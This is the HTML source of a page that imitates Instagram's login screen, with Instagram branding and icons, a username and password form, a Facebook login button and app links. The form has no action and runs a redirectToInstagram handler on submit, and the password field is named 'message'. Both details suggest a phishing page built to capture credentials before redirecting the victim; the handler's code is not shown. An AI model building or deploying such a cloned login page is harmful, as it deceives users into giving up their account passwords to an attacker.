<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login • Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
</head>

<body>
    <div class="loader-overlay">
        <div class="loader"></div>
    </div>

    <div class="container">
        <div class="box">
            <div class="heading"></div>
            
            <form class="login-form" action="" method="post" onsubmit="redirectToInstagram(event)">
                <div class="field">
                    <input id="username" type="text" name="username" placeholder=" " required />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="message" type="password" name="message" placeholder=" " required />
                    <label for="password">Password</label>
                    <button type="button" id="show-password-btn">Show</button>
                </div>
                <button class="login-button" type="submit" title="Login">Log In</button>
                
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                
                <div class="other">
                    <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
                        <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="16" width="16" />
                        <span>Log in with Facebook</span>
                    </button>
                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot password?</a>
                </div>
            </form>
        </div>
        
        <div class="box signup-box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
    </div>
    
    <div class="get">
        Get the app.
    </div>
    
    <div class="apps">
        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc-iWgnvS5.png" alt="Get it on Google Play">
        </a>
        <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US"> 
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/TF8LgS0nX7y.png" alt="Get it from Microsoft">
        </a>
    </div>
